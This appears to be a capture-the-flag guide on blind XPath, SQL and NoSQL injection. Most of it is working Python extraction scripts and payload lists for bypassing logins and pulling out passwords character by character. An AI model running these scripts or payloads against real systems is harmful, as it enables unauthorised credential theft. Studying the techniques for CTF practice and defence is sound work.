# Blind Injection Techniques - Best Practices

## 🎯 Overview

Blind injection occurs when:
- Server returns only boolean responses (success/fail, true/false)
- No direct data leakage in responses
- Data must be extracted character-by-character

Common types:
- **Blind XPath Injection** - XML database queries
- **Blind SQL Injection** - Relational database queries
- **Blind NoSQL Injection** - MongoDB, CouchDB, etc.

## ⚠️ Critical Efficiency Rules

### Time Estimation Formula

```
requests_needed = string_length × charset_size
time_sequential = requests_needed × avg_request_time (0.5s)
time_parallel = requests_needed ÷ workers × avg_request_time
```

**Example:**
- 16-char password, 90-char charset
- Sequential: 16 × 90 × 0.5s = **720 seconds** (12 min) ❌
- Parallel (10 workers): 1440 ÷ 10 × 0.5s = **72 seconds** ⚠️ Borderline
- Reduced charset (40 chars): 640 ÷ 10 × 0.5s = **32 seconds** ✅

### Golden Rule

```
IF estimated_time > 50 seconds:
    USE parallel requests OR binary search OR reduced charset
```

## 🚀 Fast Extraction Methods

### Method 1: Parallel Character Testing (FASTEST for ≤20 chars)

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "http://target.com/"
CHARS = 'abcdefghijklmnopqrstuvwxyz0123456789{}_'  # 40 chars

def test_char(pos, char):
    payload = f"' or substring(//user/pass,{pos},1)='{char}' and '1'='1"
    try:
        r = requests.post(URL, data={'name': 'admin', 'pass': payload}, timeout=2)
        return (pos, char) if 'success' in r.text.lower() else None
    except:
        return None

password = ['?'] * 16

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = []
    for pos in range(1, 17):
        for char in CHARS:
            futures.append(executor.submit(test_char, pos, char))
    
    for future in as_completed(futures):
        result = future.result()
        if result:
            pos, char = result
            password[pos-1] = char
            print(f"Pos {pos}: {char} -> {''.join(password)}")

print(f"Password: {''.join(password)}")
```

**Time:** ~30-60 seconds for 16-char password ✅

### Method 2: Binary Search (FASTEST for >20 chars or large charset)

```python
import requests

URL = "http://target.com/"

def test_greater(pos, mid_char):
    """Test if char at position is greater than mid_char."""
    payload = f"' or substring(//user/pass,{pos},1) > '{mid_char}' and '1'='1"
    r = requests.post(URL, data={'name': 'admin', 'pass': payload}, timeout=2)
    return 'success' in r.text.lower()

def find_char_binary(pos):
    low, high = 32, 126  # ASCII printable range
    while low < high:
        mid = (low + high) // 2
        if test_greater(pos, chr(mid)):
            low = mid + 1
        else:
            high = mid
    return chr(low)

# Extract
password = ""
for pos in range(1, 51):  # For longer strings
    char = find_char_binary(pos)
    password += char
    print(f"Position {pos}: {char} -> {password}")

print(f"Final: {password}")
```

**Time:** log2(94) ≈ 7 requests per char
- 50-char string: 50 × 7 × 0.5s = **175 seconds** (vs 50 × 94 × 0.5s = 2350s sequential)

### Method 3: Smart Charset Priority

```python
# Order by character frequency in typical CTF flags
PRIORITY_CHARS = (
    'etaoinshrdlcumwfgypbvkjxqz'  # Letters by English frequency
    '0123456789'                   # Digits
    '{}_'                          # Common flag delimiters
    'ABCDEFGHIJKLMNOPQRSTUVWXYZ'  # Uppercase (rare in flags)
)

def smart_extract(pos):
    for char in PRIORITY_CHARS:
        if test_char(pos, char):
            return char
    return '?'
```

## 🔧 XPath Blind Injection Specifics

### Detection Payloads

```
' or '1'='1                      # Basic bypass
' or ''='                        # Alternative bypass
' or 1=1 or 'x'='y              # Another variant
```

### Path Enumeration

```python
paths_to_try = [
    "//user/pass",
    "//user/password", 
    "//pass",
    "//password",
    "//secret",
    "//flag",
    "//admin/password",
    "//*[2]",  # Second element
    "//*[3]",  # Third element
]

for path in paths_to_try:
    payload = f"' or {path} and '1'='1"
    r = requests.post(URL, data={'name': 'admin', 'pass': payload})
    if 'success' in r.text.lower():
        print(f"[+] Path exists: {path}")
```

### Length Detection

```python
for length in range(1, 100):
    payload = f"' or string-length(//user/pass)={length} and '1'='1"
    r = requests.post(URL, data={'name': 'admin', 'pass': payload})
    if 'success' in r.text.lower():
        print(f"[+] Password length: {length}")
        break
```

### Quick Flag Search (Single Request!)

```python
# Check if flag contains known prefix
payload = "' or contains(//flag, 'picoCTF') and '1'='1"
r = requests.post(URL, data={'name': 'admin', 'pass': payload})
if 'success' in r.text.lower():
    print("[+] Flag contains 'picoCTF'!")
```

## 🔧 SQL Blind Injection Specifics

### Time-Based Detection

```sql
-- MySQL
' AND SLEEP(5)--
' AND BENCHMARK(10000000,SHA1('test'))--

-- PostgreSQL  
'; SELECT pg_sleep(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
```

### Boolean-Based Extraction

```python
# MySQL
payload = f"' AND ASCII(SUBSTRING(password,{pos},1))>{mid}--"

# PostgreSQL
payload = f"' AND ASCII(SUBSTR(password,{pos},1))>{mid}--"

# MSSQL
payload = f"' AND ASCII(SUBSTRING(password,{pos},1))>{mid}--"
```

### UNION-Based (If Error Messages Visible)

```sql
' UNION SELECT NULL,username,password FROM users--
' UNION SELECT 1,2,3,4,5--  -- Find column count first
```

## 🔧 NoSQL Blind Injection Specifics

### MongoDB Operators

```python
# Authentication bypass
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}

# Regex extraction
{"username": "admin", "password": {"$regex": "^a"}}  # Starts with 'a'
{"username": "admin", "password": {"$regex": "^ab"}} # Starts with 'ab'
```

### Regex-Based Extraction Script

```python
import requests
import string

URL = "http://target.com/login"

def test_prefix(prefix):
    payload = {
        "username": "admin",
        "password": {"$regex": f"^{prefix}"}
    }
    r = requests.post(URL, json=payload)
    return 'success' in r.text.lower()

password = ""
charset = string.ascii_lowercase + string.digits + "{}_"

while True:
    found = False
    for char in charset:
        if test_prefix(password + char):
            password += char
            print(f"Password so far: {password}")
            found = True
            break
    if not found:
        break

print(f"Full password: {password}")
```

## 🛑 Common Mistakes to Avoid

### ❌ Using Bash Loops for HTTP Requests

```bash
# BAD - Quote escaping issues + no parallelism
for char in a b c d e; do
    curl --data "pass=' or substring(//pass,1,1)='$char'"
done
```

**Problems:**
1. Single quotes in XPath conflict with bash quotes
2. No parallelism = very slow
3. Hard to handle special characters

**Solution:** Always use Python for blind injection exploitation.

### ❌ Testing Full Charset Sequentially

```python
# BAD - 16 × 94 = 1504 requests = 12+ minutes
for pos in range(1, 17):
    for char in string.printable:
        test(pos, char)
```

**Solution:** Use ThreadPoolExecutor or binary search.

### ❌ Ignoring Timeouts

If your script times out, it means:
1. Extraction is NOT complete
2. You do NOT have the flag
3. You need a FASTER approach

**Never hallucinate a flag after a timeout!**

## 📊 Time Complexity Comparison

| Method | Requests per Char | 16-char Password | 50-char String |
|--------|-------------------|------------------|----------------|
| Sequential (94 chars) | 94 | 1504 (~12 min) | 4700 (~39 min) |
| Parallel 10 workers | 94 ÷ 10 | 150 batches (~75s) | 470 batches (~4 min) |
| Reduced charset (40) | 40 | 640 (~32s parallel) | 2000 (~100s parallel) |
| Binary search | ~7 | 112 (~56s) | 350 (~3 min) |

## 🎯 Decision Tree

```
Is it blind injection?
├── YES: Can you parallelize?
│   ├── YES: String length ≤ 20?
│   │   ├── YES → Use Parallel Extraction (Method 1)
│   │   └── NO → Use Binary Search (Method 2)
│   └── NO: Use Binary Search (always works)
└── NO: Use standard exploitation techniques
```

## 🔗 Related Resources

- [XPath Injection - OWASP](https://owasp.org/www-community/attacks/XPATH_Injection)
- [Blind SQL Injection - PortSwigger](https://portswigger.net/web-security/sql-injection/blind)
- [NoSQL Injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
